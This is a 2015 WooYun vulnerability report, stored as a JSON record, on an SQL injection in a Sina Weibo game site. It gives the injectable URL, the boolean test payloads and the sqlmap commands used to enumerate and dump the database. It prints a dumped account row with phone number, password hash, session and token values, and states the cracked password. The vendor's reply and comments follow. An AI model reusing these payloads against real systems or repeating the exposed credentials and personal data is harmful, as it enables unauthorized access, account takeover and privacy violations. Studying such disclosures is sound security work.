{"id": 45401, "wybug_id": "wooyun-2015-096047", "wybug_title": "新浪微博某站存在sql注入(158万账户泄漏)", "wybug_corp": "新浪", "wybug_author": "kttzd", "wybug_date": "2015-02-06 16:22", "wybug_open_date": "2015-03-23 16:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向公众公开  简要描述： 目测出奇迹 详细说明：  问题站点：             i.game.weibo.cn注入点：             http://i.game.weibo.cn/appsvc/appsvc.php?bid=13&cmd=packageinfo&package=a5game.leidian2_sinas测试：            http://i.game.weibo.cn/appsvc/appsvc.php?bid=13 and 0 --&cmd=packageinfo&package=a5game.leidian2_sinas            http://i.game.weibo.cn/appsvc/appsvc.php?bid=13 and 1 --&cmd=packageinfo&package=a5game.leidian2_sinas存在注入，使用sqlmap跑一下sqlmap -u \"http://i.game.weibo.cn/appsvc/appsvc.php?bid=13&cmd=packageinfo&package=a5game.leidian2_sinas\" -p bid \n\n\navailable databases [3]:[*] game_center[*] information_schema[*] test\n查看game_center里面\n+---------------------------+| admin_access_control_list || admin_resources           || admin_roles               || admin_users               || base_config               || cms_app                   || cms_app_base_content      || cms_app_content           || cms_app_content_version   || cms_app_pt_map            || cms_app_res               || cms_biz_app               || cms_biz_app_prop_val      || cms_biz_app_tag           || cms_biz_category          || cms_biz_chart_app         || cms_biz_charts            || cms_biz_events            || cms_biz_events_imgs       || cms_biz_property          || cms_biz_report            || cms_business              || cms_platform              || cms_taglib                || cooper_info               || cooper_ratio              || event_awards              || event_draw_log            || event_user                || product_slow              || sdk_msg                   || sng_apk_info              || sng_noticelist            || sso_user_auth             || term_rom                  || term_screen               || term_system               |+---------------------------+\n其中admin_users明文存储sqlmap -u \"http://i.game.weibo.cn/appsvc/appsvc.php?bid=13&cmd=packageinfo&package=a5game.leidian2_sinas\" -p bid -T game_center -T sso_user_auth --count\n\n\nDatabase: game_centerTable: sso_user_auth[11 columns]+------------+-------------+| Column     | Type        |+------------+-------------+| createtime | datetime    || gsid       | varchar(30) || id         | int(11)     || machineid  | varchar(50) || mobile     | varchar(15) || modifytime | datetime    || name       | varchar(30) || pw         | varchar(32) || texpire    | datetime    || token      | varchar(32) || uid        | varchar(20) |+------------+-------------+\n任意读取一个账户sqlmap -u \"http://i.game.weibo.cn/appsvc/appsvc.php?bid=13&cmd=packageinfo&package=a5game.leidian2_sinas\" -p bid -T game_center -T sso_user_auth --dump --start 10000 --stop 10000\n+-------+------------+-----------------------------+----------------------------------+----------------------------------+-------------+----------------------------------+-------------+---------------------+---------------------+---------------------+| id    | uid        | gsid                        | machineid                        | pw                               | name        | token                            | mobile      | texpire             | createtime          | modifytime          |+-------+------------+-----------------------------+----------------------------------+----------------------------------+-------------+----------------------------------+-------------+---------------------+---------------------+---------------------+| 10043 | 3848812356 | 4u8860cc6ENzM33DYFUnog9fC5K | 772a1b0042768a4ccab72c058145ab47 | e807f1fcf82d132f9bb018ca6738a19f | 13545060302 | 4420d17727b1b2f9d01d8ed9c6ff5da6 | 13545060302 | 2013-11-12 19:33:13 | 2013-10-12 19:33:13 | 2013-10-12 19:33:13 |+-------+------------+-----------------------------+----------------------------------+----------------------------------+-------------+----------------------------------+-------------+---------------------+---------------------+---------------------+\n账户13545060302  密码md5解出来是1234567890登录新浪微博   漏洞证明：  \n\n这个应该是测试账户，如果说都是测试账户的话，分分种给别人加几十万僵尸粉应该不是问题...未继续深入   修复方案：  你们更懂 ><   版权声明：转载请注明来源 kttzd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-02-06 22:21 厂商回复： 是某业务游客临时使用帐号，感谢关注新浪安全。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-06 16:29 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  哪有那么多的一百多万    \n     2015-02-06 16:31 |    \t\tkttzd \t\t\t( 普通白帽子  |\t\t\t        Rank:191 漏洞数:15        | 淡定)\t\t \n  @紫霞仙子 都是一个人的小号。    \n     2015-02-06 16:33 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  前排    \n     2015-02-07 09:44 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  哟    \n     2015-02-07 16:41 |    \t\tkttzd \t\t\t( 普通白帽子  |\t\t\t        Rank:191 漏洞数:15        | 淡定)\t\t \n  @scanf 约    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}